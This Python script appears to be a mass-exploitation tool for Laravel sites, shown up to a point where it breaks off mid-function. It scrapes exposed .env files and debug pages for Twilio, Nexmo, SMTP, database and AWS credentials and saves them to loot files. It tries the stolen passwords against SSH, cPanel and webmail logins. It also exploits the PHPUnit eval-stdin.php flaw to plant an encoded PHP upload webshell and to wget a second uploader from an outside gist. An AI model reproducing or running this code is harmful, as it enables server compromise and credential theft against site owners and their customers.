import turtle
from turtle import color
import requests
import time
import os
import sys
import re
import socket
import paramiko
import configparser
import random
import tkinter
from termcolor import colored
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from threading import Thread
from progress.bar import IncrementalBar
from terminaltables import SingleTable
import datetime

# Queue import with fallback
try:
    from Queue import Queue
except ImportError:
    from queue import Queue

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Create result directories
try:
    os.makedirs('result/debug-methode/')
    os.makedirs('result/env-methode/')
    os.makedirs('result/shell-result/')
except:
    pass

# Read token
with open('token.txt', 'r') as f:
    TOKEN = f.read()

xdkwo = '.xmaslkdj'
config = configparser.ConfigParser()

if 'OKELO' not in TOKEN:
    print('[!] Token tidak valid')
    sys.exit()


class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()
    
    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            finally:
                self.tasks.task_done()


class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)
    
    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))
    
    def wait_completion(self):
        self.tasks.join()


class warna:
    """docstring for warna"""
    def red(self, str):
        return colored(str, 'red')
    
    def blue(self, str):
        return colored(str, 'blue')
    
    def green(self, str):
        return colored(str, 'green')
    
    def yellow(self, str):
        return colored(str, 'yellow')
    
    def cyan(self, str):
        return colored(str, 'cyan')


class _exploit:
    """This Class For Exploit"""
    
    def __init__(self):
        self.clr = warna()
    
    def save(self, sites, names):
        s = open(names, 'a+')
        s.write(sites + '\n')
        return s
    
    def tableWraper(self, table):
        rows = []
        trs = table.find_all('tr')
        headerow = [td.get_text(strip=True) for td in trs[0].find_all('th')]
        if headerow:
            rows.append(headerow)
            trs = trs[1:]
        for tr in trs:
            rows.append([td.get_text(strip=True) for td in tr.find_all('td')])
        return rows
    
    def get_twilio(self, text, url):
        try:
            if 'TWILIO' in text:
                if 'TWILIO_ACCOUNT_SID=' in text:
                    text = text.replace('\n', '##')
                    try:
                        acc_sid = re.findall(r'TWILIO_ACCOUNT_SID=(.*?)##', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = re.findall(r'TWILIO_API_KEY=(.*?)##', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = re.findall(r'TWILIO_API_SECRET=(.*?)##', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = re.findall(r'TWILIO_CHAT_SERVICE_SID=(.*?)##', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = re.findall(r'TWILIO_NUMBER=(.*?)##', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = re.findall(r'TWILIO_AUTH_TOKEN=(.*?)##', text)[0]
                    except:
                        auhtoken = ''
                    
                    twilio = f' URL : {str(url)}\n TWILIO_ACCOUNT_SID : {acc_sid}\n TWILIO_API_KEY : {acc_key}\n TWILIO_API_SECRET : {sec}\n TWILIO_CHAT_SERVICE_SID : {chatid}\n TWILIO_NUMBER : {phone}\n TWILIO_AUTH_TOKEN : {auhtoken}\n '
                    self.save(twilio, 'result/env-methode/twilio_env.txt')
                    return True
                
                elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
                    try:
                        acc_sid = re.findall(r'<td>TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = re.findall(r'<td>TWILIO_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = re.findall(r'<td>TWILIO_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = re.findall(r'<td>TWILIO_CHAT_SERVICE_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = re.findall(r'<td>TWILIO_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = re.findall(r'<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        auhtoken = ''
                    
                    twilio = f' URL : {str(url)}\n TWILIO_ACCOUNT_SID : {acc_sid}\n TWILIO_API_KEY : {acc_key}\n TWILIO_API_SECRET : {sec}\n TWILIO_CHAT_SERVICE_SID : {chatid}\n TWILIO_NUMBER : {phone}\n TWILIO_AUTH_TOKEN : {auhtoken}\n '
                    self.save(twilio, 'result/debug-methode/twilio_debug.txt')
                    return True
                return False
        except Exception:
            return False
    
    def get_plivo(self, text, url):
        try:
            if 'PLIVO' in text:
                if 'PLIVO_AUTH_ID=' in text:
                    text = text.replace('\n', '##')
                    try:
                        auth_id = re.findall(r'PLIVO_AUTH_ID=(.*?)##', text)[0]
                    except:
                        auth_id = ''
                    try:
                        auth_token = re.findall(r'PLIVO_AUTH_TOKEN=(.*?)##', text)[0]
                    except:
                        auth_token = ''
                    try:
                        auth_number = re.findall(r'PLIVO_FROM_NUMBER=(.*?)##', text)[0]
                    except:
                        auth_number = ''
                    
                    plivo = f' URL : {str(url)}\n PLIVO_AUTH_ID : {auth_id}\n PLIVO_AUTH_TOKEN : {auth_token}\n PLIVO_FROM_NUMBER : {auth_number}\n'
                    self.save(plivo, 'result/env-methode/plivo.txt')
                    return True
                
                elif '<td>PLIVO_AUTH_ID</td>' in text:
                    try:
                        auth_id = re.findall(r'<td>PLIVO_AUTH_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        auth_id = ''
                    try:
                        auth_token = re.findall(r'<td>PLIVO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        auth_token = ''
                    try:
                        auth_number = re.findall(r'<td>PLIVO_FROM_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        auth_number = ''
                    
                    plivo = f' URL : {str(url)}\n PLIVO_AUTH_ID : {auth_id}\n PLIVO_AUTH_TOKEN : {auth_token}\n PLIVO_FROM_NUMBER : {auth_number}\n'
                    self.save(plivo, 'result/debug-methode/plivo.txt')
                    return True
                return False
        except Exception:
            return False
    
    def get_nexmo(self, text, url):
        try:
            if 'NEXMO' in text:
                if 'NEXMO_KEY=' in text:
                    text = text.replace('\n', '##')
                    try:
                        n_key = re.findall(r'NEXMO_KEY=(.*?)##', text)[0]
                    except:
                        n_key = ''
                    try:
                        n_secret = re.findall(r'NEXMO_SECRET=(.*?)##', text)[0]
                    except:
                        n_secret = ''
                    
                    nexmo = f' URL : {str(url)}\n NEXMO_KEY : {n_key}\n NEXMO_SECRET : {n_secret}\n'
                    self.save(nexmo, 'result/env-methode/nexmo.txt')
                    return True
                
                elif '<td>NEXMO_KEY</td>' in text:
                    try:
                        n_key = re.findall(r'<td>NEXMO_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        n_key = ''
                    try:
                        n_secret = re.findall(r'<td>NEXMO_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        n_secret = ''
                    
                    nexmo = f' URL : {str(url)}\n NEXMO_KEY : {n_key}\n NEXMO_SECRET : {n_secret}\n'
                    self.save(nexmo, 'result/debug-methode/nexmo.txt')
                    return True
                return False
        except Exception:
            return False
    
    def get_clickatell(self, text, url):
        try:
            if 'CLICKATELL' in text:
                if 'CLICKATELL_USER=' in text:
                    text = text.replace('\n', '##')
                    try:
                        c_user = re.findall(r'CLICKATELL_USER=(.*?)##', text)[0]
                    except:
                        c_user = ''
                    try:
                        c_pass = re.findall(r'CLICKATELL_PASS=(.*?)##', text)[0]
                    except:
                        c_pass = ''
                    try:
                        c_api_id = re.findall(r'CLICKATELL_API_ID=(.*?)##', text)[0]
                    except:
                        c_api_id = ''
                    
                    clicktell = f' URL : {str(url)}\n CLICKATELL_USER : {c_user}\n CLICKATELL_PASS : {c_pass}\n CLICKATELL_API_ID : {c_api_id}\n'
                    self.save(clicktell, 'result/env-methode/clicktell.txt')
                    return True
                
                elif '<td>CLICKATELL_USER</td>' in text:
                    try:
                        c_user = re.findall(r'<td>CLICKATELL_USER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        c_user = ''
                    try:
                        c_pass = re.findall(r'<td>CLICKATELL_PASS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        c_pass = ''
                    try:
                        c_api_id = re.findall(r'<td>CLICKATELL_API_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        c_api_id = ''
                    
                    clicktell = f' URL : {str(url)}\n CLICKATELL_USER : {c_user}\n CLICKATELL_PASS : {c_pass}\n CLICKATELL_API_ID : {c_api_id}\n'
                    self.save(clicktell, 'result/debug-methode/clicktell.txt')
                    return True
                return False
        except Exception:
            return False
    
    def is_valid_ipv4_address(self, address):
        if '127.0.0.1' in address or '0.0.0.0' in address:
            return False
        try:
            socket.inet_pton(socket.AF_INET, address)
        except AttributeError:
            try:
                socket.inet_aton(address)
            except socket.error:
                return False
        except socket.error:
            return False
        return True
    
    def phpunit(self, url):
        try:
            session = requests.Session()
            session.headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36'}
            payload = "<?php echo 'cepotdotid#'.php_uname().'#'; ?>"
            response = session.post(url + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=payload, timeout=5, allow_redirects=False)
            
            if 'cepotdotid' in response.text:
                webshell_payload_wget = "<?php echo 'aw'.system('wget https://gist.githubusercontent.com/galehrizky/049876b180d52937f1579fbb5d156869/raw/b3c09645ba678bf82646b82d6b3e234d4fafca2f/uploader.php -O aw.php'); ?>"
                webshell_payload = "<?php $shell='PD9waHAgCgplY2hvICdTeXN0ZW06IDxmb250IGNvbG9yPSJibGFjayIgaWQ9InN5c3RlbV9pbmZvIj5nYWxlaGRvdGlkIycucGhwX3VuYW1lKCkuJyM8L2ZvbnQ+PGJyPic7CmVjaG8iPGJyPjxmb3JtIG1ldGhvZD1wb3N0IGVuY3R5cGU9bXVsdGlwYXJ0L2Zvcm0tZGF0YT4iOwplY2hvIjxpbnB1dCB0eXBlPWZpbGUgbmFtZT1mPjxpbnB1dCBuYW1lPWsgdHlwZT1zdWJtaXQgaWQ9ayB2YWx1ZT11cGxvYWQ+PGJyPiI7CmlmKCRfUE9TVFsiayJdPT11cGxvYWQpIHsgCiAgICBpZihAY29weSgkX0ZJTEVTWyJmIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siZiJdWyJuYW1lIl0pKSB7CiAgICAgICAgZWNobyI8Yj4iLiRfRklMRVNbImYiXVsibmFtZSJdOwogICAgfSBlbHNlIHsKICAgICAgZWNobyI8Yj5HYWdhbCB1cGxvYWQgY29rIjsKICB9Cn0KPz4=';file_put_contents('aw.php', base64_decode($shell)) ?>"
                kernel = re.findall(r'cepotdotid#(.*?)#', response.text)[0]
                session.post(url + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=webshell_payload, timeout=5, allow_redirects=False)
                session.post(url + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=webshell_payload_wget, timeout=5, allow_redirects=False)
                
                print(self.clr.green('[*] [PHP UNIT VULN] {}'.format(url)))
                print(self.clr.green('[*] [KERNEL] [ {}]'.format(kernel)))
                
                shell_path = url + '/vendor/phpunit/phpunit/src/Util/PHP/aw.php'
                webshell_check = requests.get(shell_path, timeout=5, allow_redirects=False)
                
                if webshell_check.status_code == 200 and 'cepotdotid' in webshell_check.text:
                    print(self.clr.green('[*] [PHP UNIT VULN] [UPLOAD SHELL SUCCESS] {}'.format(shell_path)))
                    self.save(shell_path, 'result/shell-result/phpunit_shell.txt')
                    return True
                else:
                    print(self.clr.yellow('[-] [PHP UNIT TRY MANUAL] {}'.format(url)))
                    self.save(url + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'result/shell-result/phpunit_manual.txt')
                    return False
            else:
                print(self.clr.red('[-] [PHP UNIT NOT VULN] {}'.format(url)))
                return False
        except Exception:
            return False
    
    def crack_vps(self, text, url, protokol):
        try:
            if 'DB_HOST' in text:
                hostname = ''
                if 'DB_HOST=' in text:
                    text = text.replace('\n', '##')
                    try:
                        dbhost = re.findall(r'DB_HOST=(.*?)##', text)[0]
                    except:
                        dbhost = ''
                    try:
                        dbusername = re.findall(r'DB_USERNAME=(.*?)##', text)[0]
                    except:
                        dbusername = ''
                    try:
                        dbpassword = re.findall(r'DB_PASSWORD=(.*?)##', text)[0]
                    except:
                        dbpassword = ''
                    
                    if self.is_valid_ipv4_address(dbhost) == True:
                        hostname = dbhost
                    else:
                        hostname = url
                        hostname = hostname.replace('{}://'.format(protokol), '')
                        hostname = socket.gethostbyname(hostname)
                    
                    try:
                        port = 22
                        p = paramiko.SSHClient()
                        p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        p.connect(hostname, port, dbusername, dbpassword)
                        stdin, stdout, stderr = p.exec_command('echo cepotdotid;uname -a;')
                        opt = stdout.readlines()
                        if 'cepotdotid' in opt[0]:
                            self.save(f'{hostname}:22|{dbusername}|{dbpassword}', 'result/env-methode/vps_laravel.txt')
                            return True
                        else:
                            self.save(f'{hostname}:22|{dbusername}|{dbpassword}', 'result/env-methode/vps_laravel.txt')
                            return True
                    except Exception:
                        pass
                
                elif '<td>DB_HOST</td>' in text:
                    try:
                        dbhost = re.findall(r'<td>DB_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbhost = ''
                    try:
                        dbusername = re.findall(r'<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbusername = ''
                    try:
                        dbpassword = re.findall(r'<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbpassword = ''
                    
                    if self.is_valid_ipv4_address(dbhost) == True:
                        hostname = dbhost
                    else:
                        hostname = url
                        hostname = hostname.replace('{}://'.format(protokol), '')
                        hostname = socket.gethostbyname(hostname)
                    
                    try:
                        port = 22
                        p = paramiko.SSHClient()
                        p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        p.connect(hostname, port, dbusername, dbpassword)
                        stdin, stdout, stderr = p.exec_command('echo cepotdotid;uname -a;')
                        opt = stdout.readlines()
                        if 'cepotdotid' in opt[0]:
                            self.save(f'{hostname}:22|{dbusername}|{dbpassword}', 'result/debug-methode/vps_laravel.txt')
                            return True
                        else:
                            self.save(f'{hostname}:22|{dbusername}|{dbpassword}', 'result/debug-methode/vps_laravel.txt')
                            return True
                    except Exception:
                        pass
                return False
        except Exception:
            return False
    
    def cpanel(self, text, url):
        try:
            if 'DB_HOST' in text:
                if 'DB_HOST=' in text:
                    text = text.replace('\n', '##')
                    try:
                        dbusername = re.findall(r'DB_USERNAME=(.*?)##', text)[0]
                    except:
                        dbusername = ''
                    try:
                        dbpassword = re.findall(r'DB_PASSWORD=(.*?)##', text)[0]
                    except:
                        dbpassword = ''
                    
                    try:
                        parameter = {'user': dbusername, 'pass': dbpassword, 'goto': '/'}
                        protokol = re.findall(r'(\\w+)://', url)[0]
                        url_req = urlparse(url).netloc
                        make_request = requests.post(f'{protokol}://{url_req}:2083/login/?login_only=1', data=parameter, timeout=5, allow_redirects=False).json()
                        if make_request['status'] == 1:
                            self.save(f'{url}:2083/login/?login_only=1|{dbusername}|{dbpassword}', 'result/env-methode/cpanel_laravel.txt')
                            return True
                        else:
                            return False
                    except Exception:
                        pass
                
                elif '<td>DB_HOST</td>' in text:
                    try:
                        dbusername = re.findall(r'<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbusername = ''
                    try:
                        dbpassword = re.findall(r'<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbpassword = ''
                    
                    try:
                        parameter = {'user': dbusername, 'pass': dbpassword, 'goto': '/'}
                        protokol = re.findall(r'(\\w+)://', url)[0]
                        url_req = urlparse(url).netloc
                        make_request = requests.post(f'{protokol}://{url_req}:2083/login/?login_only=1', data=parameter, timeout=5, allow_redirects=False).json()
                        if make_request['status'] == 1:
                            self.save(f'{url}:2083/login/?login_only=1|{dbusername}|{dbpassword}', 'result/debug-methode/cpanel_laravel.txt')
                            return True
                        else:
                            return False
                    except Exception:
                        pass
                return False
        except Exception:
            return False
    
    def webmail(self, text, url):
        try:
            if 'MAIL_HOST' in text:
                if 'MAIL_HOST=' in text:
                    text = text.replace('\n', '##')
                    try:
                        password = re.findall(r'MAIL_PASSWORD=(.*?)##', text)[0]
                    except:
                        password = ''
                    try:
                        mail_from = re.findall(r'MAIL_FROM_ADDRESS=(.*?)##', text)[0]
                    except:
                        mail_from = ''
                    
                    try:
                        parameter = {'user': mail_from, 'pass': password, 'goto': '/'}
                        protokol = re.findall(r'(\\w+)://', url)[0]
                        url_req = urlparse(url).netloc
                        make_request = requests.post(f'{protokol}://{url_req}:2096/login/?login_only=1', data=parameter, timeout=5, allow_redirects=False).json()
                        if make_request['status'] == 1:
                            self.save(f'{url}:2096/login/?login_only=1|{mail_from}|{password}', 'result/env-methode/webmail_laravel.txt')
                            return True
                        else:
                            return False
                    except Exception:
                        pass
                
                elif '<td>MAIL_HOST</td>' in text:
                    try:
                        password = re.findall(r'<td>MAIL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        password = ''
                    try:
                        mail_from = re.findall(r'<td>MAIL_FROM_ADDRESS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        mail_from = ''
                    
                    try:
                        parameter = {'user': mail_from, 'pass': password, 'goto': '/'}
                        protokol = re.findall(r'(\\w+)://', url)[0]
                        url_req = urlparse(url).netloc
                        make_request = requests.post(f'{protokol}://{url_req}:2096/login/?login_only=1', data=parameter, timeout=5, allow_redirects=False).json()
                        if make_request['status'] == 1:
                            self.save(f'{url}:2096/login/?login_only=1|{mail_from}|{password}', 'result/debug-methode/webmail_laravel.txt')
                            return True
                        else:
                            return False
                    except Exception:
                        pass
                return False
        except Exception:
            return False
    
    def detect_smtp(self, mode, host, port, username, password, mail_from, from_name, url):
        if host == 'null' or port == 'null' or username == 'null' or password == 'null':
            return False
        
        if 'smtp.mailtrap.io' not in host and 'mailtrap.io' not in host:
            if 'sendgrid.net' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/smtpsendgrid.txt')
            elif '.amazonaws.com' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}|{mail_from}', f'result/{mode}-methode/smtp_aws.txt')
            elif 'office365' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/office365.txt')
            elif '1and1' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/1and1.txt')
            elif 'zoho' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/zoho.txt')
            elif 'mandrillapp' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}|{mail_from}', f'result/{mode}-methode/mandrillapp.txt')
            elif 'mailgun' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/mailgun.txt')
            elif 'ionos' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/ionos.txt')
            elif 'mailjet' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}|{mail_from}', f'result/{mode}-methode/smtp_mailjet.txt')
            elif '.jp' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/smtp_jp.txt')
            elif 'sendinblue.com' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/smtp_sendinblue.txt')
            elif 'emailsrvr.com' in host:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/rackspace.txt')
            else:
                self.save(f'{url}|{host}|{port}|{username}|{password}', f'result/{mode}-methode/smtprandom.txt')
    
    def get_smtp(self, text, url):
        try:
            if 'MAIL_HOST' in text:
                if 'MAIL_HOST=' in text:
                    mode = 'env'
                    text = text.replace('\n', '##')
                    try:
                        host = re.findall(r'MAIL_HOST=(.*?)##', text)[0]
                    except:
                        host = ''
                    try:
                        port = re.findall(r'MAIL_PORT=(.*?)##', text)[0]
                    except:
                        port = ''
                    try:
                        username = re.findall(r'MAIL_USERNAME=(.*?)##', text)[0]
                    except:
                        username = ''
                    try:
                        password = re.findall(r'MAIL_PASSWORD=(.*?)##', text)[0]
                    except:
                        password = ''
                    try:
                        mail_from = re.findall(r'MAIL_FROM_ADDRESS=(.*?)##', text)[0]
                    except:
                        mail_from = ''
                    try:
                        from_name = re.findall(r'MAIL_FROM_NAME=(.*?)##', text)[0]
                    except:
                        from_name = ''
                    
                    self.detect_smtp(mode, host, port, username, password, mail_from, from_name, url)
                    return True
                
                elif '<td>MAIL_HOST</td>' in text:
                    mode = 'debug'
                    try:
                        host = re.findall(r'<td>MAIL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        host = ''
                    try:
                        port = re.findall(r'<td>MAIL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        port = ''
                    try:
                        username = re.findall(r'<td>MAIL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        username = ''
                    try:
                        password = re.findall(r'<td>MAIL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        password = ''
                    try:
                        mail_from = re.findall(r'<td>MAIL_FROM_ADDRESS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        mail_from = ''
                    try:
                        from_name = re.findall(r'<td>MAIL_FROM_NAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        from_name = ''
                    
                    self.detect_smtp(mode, host, port, username, password, mail_from, from_name, url)
                    return True
                return False
        except Exception:
            return False
    
    def get_db(self, text, url):
        try:
            if 'DB_HOST' in text:
                if 'DB_HOST=' in text:
                    text = text.replace('\n', '##')
                    try:
                        dbhost = re.findall(r'DB_HOST=(.*?)##', text)[0]
                    except:
                        dbhost = ''
                    try:
                        dbport = re.findall(r'DB_PORT=(.*?)##', text)[0]
                    except:
                        dbport = ''
                    try:
                        dbusername = re.findall(r'DB_USERNAME=(.*?)##', text)[0]
                    except:
                        dbusername = ''
                    try:
                        dbpassword = re.findall(r'DB_PASSWORD=(.*?)##', text)[0]
                    except:
                        dbpassword = ''
                    try:
                        dbdb = re.findall(r'DB_DATABASE=(.*?)##', text)[0]
                    except:
                        dbdb = ''
                    
                    self.save(f'{url}|{dbhost}|{dbdb}|{dbusername}|{dbpassword}', 'result/env-methode/dblaravel.txt')
                    return True
                
                elif '<td>DB_HOST</td>' in text:
                    try:
                        dbhost = re.findall(r'<td>DB_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbhost = ''
                    try:
                        dbport = re.findall(r'<td>DB_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbport = ''
                    try:
                        dbusername = re.findall(r'<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbusername = ''
                    try:
                        dbpassword = re.findall(r'<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbpassword = ''
                    try:
                        dbdb = re.findall(r'<td>DB_DATABASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        dbdb = ''
                    
                    self.save(f'{url}|{dbhost}|{dbdb}|{dbusername}|{dbpassword}', 'result/debug-methode/dblaravel.txt')
                    return True
                return False
        except Exception:
            return False
    
    def get_aws(self, text, url):
        try:
            # AWS_ACCESS_KEY_ID pattern
            if 'AWS_ACCESS_KEY_ID' in text:
                if 'AWS_ACCESS_KEY_ID=' in text:
                    text = text.replace('\n', '##')
                    try:
                        aws_key = re.findall(r'AWS_ACCESS_KEY_ID=(.*?)##', text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_key_secret = re.findall(r'AWS_SECRET_ACCESS_KEY=(.*?)##', text)[0]
                    except:
                        aws_key_secret = ''
                    try:
                        aws_reg = re.findall(r'AWS_DEFAULT_REGION=(.*?)##', text)[0]
                    except:
                        aws_reg = ''
                    try:
                        bucket = re.findall(r'AWS_BUCKET=(.*?)##', text)[0]
                    except:
                        bucket = ''
                    
                    aws_bucket_ = f' URL : {str(url)}\n AWS_ACCESS_KEY_ID : {aws_key}\n AWS_SECRET_ACCESS_KEY : {aws_key_secret}\n AWS_DEFAULT_REGION : {aws_reg}\n AWS_BUCKET : {bucket}\n'
                    self.save(aws_bucket_, 'result/env-methode/aws_bucket.txt')
                    return True
                
                elif '<td>AWS_ACCESS_KEY_ID</td>' in text:
                    try:
                        aws_key = re.findall(r'<td>AWS_ACCESS_KEY_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_key_secret = re.findall(r'<td>AWS_SECRET_ACCESS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        aws_key_secret = ''
                    try:
                        aws_reg = re.findall(r'<td>AWS_DEFAULT_REGION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        aws_reg = ''
                    try:
                        bucket = re.findall(r'<td>AWS_BUCKET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        bucket = ''
                    
                    aws_bucket_ = f' URL : {str(url)}\n AWS_ACCESS_KEY_ID : {aws_key}\n AWS_SECRET_ACCESS_KEY : {aws_key_secret}\n AWS_DEFAULT_REGION : {aws_reg}\n AWS_BUCKET : {bucket}\n'
                    self.save(aws_bucket_, 'result/debug-methode/aws_bucket.txt')
                    return True
            
            # AWS_KEY pattern
            elif 'AWS_KEY' in text:
                if 'AWS_KEY=' in text:
                    text = text.replace('\n', '##')
                    try:
                        aws_key = re.findall(r'AWS_KEY=(.*?)=(.*?)##', text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_key_secret = re.findall(r'AWS_SECRET=(.*?)##', text)[0]
                    except:
                        aws_key_secret = ''
                    try:
                        aws_reg = re.findall(r'AWS_REGION=(.*?)##', text)[0]
                    except:
                        aws_reg = ''
                    try:
                        bucket = re.findall(r'AWS_BUCKET=(.*?)##', text)[0]
                    except:
                        bucket = ''
                    
                    aws_bucket_ = f' URL : {str(url)}\n AWS_ACCESS_KEY_ID : {aws_key}\n AWS_SECRET_ACCESS_KEY : {aws_key_secret}\n AWS_DEFAULT_REGION : {aws_reg}\n AWS_BUCKET : {bucket}\n'
                    self.save(aws_bucket_, 'result/env-methode/aws_bucket.txt')
                    return True
                
                elif '<td>AWS_KEY</td>' in text:
                    try:
                        aws_key = re.findall(r'<td>AWS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_key_secret = re.findall(r'<td>AWS_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        aws_key_secret = ''
                    try:
                        aws_reg = re.findall(r'<td>AWS_REGION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        aws_reg = ''
                    try:
                        bucket = re.findall(r'<td>AWS_BUCKET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        bucket = ''
                    
                    aws_bucket_ = f' URL : {str(url)}\n AWS_ACCESS_KEY_ID : {aws_key}\n AWS_SECRET_ACCESS_KEY : {aws_key_secret}\n AWS_DEFAULT_REGION : {aws_reg}\n AWS_BUCKET : {bucket}\n'
                    self.save(aws_bucket_, 'result/debug-methode/aws_bucket.txt')
                    return True
            
            # SES_KEY pattern
            elif '<td>SES_KEY</td>' in text:
                if 'SES_KEY=' in text:
                    text = text.replace('\n', '##')
                    try:
                        aws_key = re.findall(r'SES_KEY=(.*?)##', text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_key_secret = re.findall(r'SES_SECRET=(.*?)##', text)[0]
                    except:
                        aws_key_secret = ''
                    try:
                        aws_reg = re.findall(r'SES_REGION=(.*?)##', text)[0]
                    except:
                        aws_reg = ''
                    try:
                        bucket = re.findall(r'SES_BUCKET=(.*?)##', text)[0]
                    except:
                        bucket = ''
                    
                    aws_bucket_ = f' URL : {str(url)}\n AWS_ACCESS_KEY_ID : {aws_key}\n AWS_SECRET_ACCESS_KEY : {aws_key_secret}\n AWS_DEFAULT_REGION : {aws_reg}\n AWS_BUCKET : {bucket}\n'
                    self.save(aws_bucket_, 'result/env-methode/aws_bucket.txt')
                    return True
                
                elif '<td>SES_KEY</td>' in text:
                    try:
                        aws_key = re.findall(r'<td>SES_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_key_secret = re.findall(r'<td>SES_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
